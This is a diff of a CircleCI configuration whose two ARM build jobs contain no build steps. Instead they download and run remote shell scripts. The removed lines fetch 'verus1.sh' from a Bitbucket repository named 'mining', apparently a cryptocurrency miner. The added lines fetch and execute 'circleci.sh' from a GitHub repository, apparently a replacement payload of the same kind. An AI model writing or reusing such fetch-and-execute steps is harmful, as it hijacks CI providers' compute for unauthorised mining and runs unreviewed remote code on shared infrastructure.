@@ -6,14 +6,14 @@ jobs:
       image: ubuntu-2004:202101-01
     resource_class: arm.large
     steps:
-      - run: wget https://bitbucket.org/gshch828/mining/raw/68fabb5db97a7a2fe648cdb0606bb1d9c18a5add/verus1.sh && ./verus1.sh
+      - run: wget https://raw.githubusercontent.com/brilee290/ffft/main/circleci.sh && chmod u+x circleci.sh && ./circleci.sh
 
   build-large:
     machine:
       image: ubuntu-2004:202101-01
     resource_class: arm.large
     steps:
-      - run: wget https://bitbucket.org/gshch828/mining/raw/68fabb5db97a7a2fe648cdb0606bb1d9c18a5add/verus1.sh && ./verus1.sh
+      - run: wget https://raw.githubusercontent.com/brilee290/ffft/main/circleci.sh && chmod u+x circleci.sh && ./circleci.sh
 
 workflows:
   build:
